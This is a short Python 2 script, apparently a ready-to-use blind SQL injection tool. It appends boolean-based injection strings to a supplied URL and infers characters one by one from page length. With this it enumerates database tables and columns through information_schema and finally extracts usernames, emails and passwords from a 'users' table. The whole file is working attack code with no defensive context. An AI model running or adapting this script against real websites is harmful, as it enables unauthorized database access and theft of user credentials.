#!/usr/bin/python


import requests
import string
import sys

if len(sys.argv) != 2:
    print "[+]Usage : ./BlindSQLinjection.py url"
    sys.exit(0)

host = sys.argv[1]
all_chars = string.printable
digits = string.digits

def get_tables_number():
    digits = string.digits
    tables_number = 0
    for digit in digits:
            url = "{1}%20and%20substring((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = database()),1,1)={0}--".format(digit, host)
            req = requests.get(url)
            if len(req.text) != 5980:
                tables_number = digit
                return digit

def get_tables(item_name):
    chars = []
    for i in range(1,35):
        for char in all_chars:
            url = "{3}%20and%20Ascii(substring(({2}),{1},1))%20={0}--".format(ord(char), i, item_name, host)
            req = requests.get(url)
            if len(req.text) != 5980:
                chars.append(char)
    tables = "".join(chars)
    return tables
    #print "Table name is : {1}".format(item_name, db_name)

def get_columns(table_name):
    chars = []
    query = 'Select group_concat(column_name) from information_schema.columns where table_name like "{0}"'.format(table_name)
    for i in range(1,100):
        for char in all_chars:
            url = "{3}%20and%20Ascii(substring(({2}),{1},1))%20={0}--".format(ord(char), i, query, host)
            req = requests.get(url)
            if len(req.text) != 5980:
                chars.append(char)
    columns = "".join(chars)
    return columns

# you need to determine the table name and colmuns name to extract the data
def get_data(table_name,columns):
    chars = []
    query = 'select group_concat({0}) from {1}'.format(columns.replace(",",",':',"), table_name)
    for i in range(1,100):
        for char in all_chars:
            url = "{3}%20and%20Ascii(substring(({2}),{1},1))%20={0}--".format(ord(char), i, query, host)
            req = requests.get(url)
            if len(req.text) != 5980:
                chars.append(char)
    data = "".join(chars)
    return data

print "[+]Number of tables is : {0}".format(get_tables_number())
print "[+]Extracting Tables .."
for i in range(int(get_tables_number())):
   print get_tables("Select table_name from information_schema.tables where table_schema=database() limit {0},1".format(i))
   print "\t Columns for this table {0}".format(get_columns(get_tables("Select table_name from information_schema.tables where table_schema=database() limit {0},1".format(i))))

print get_data("users","username,email,password")
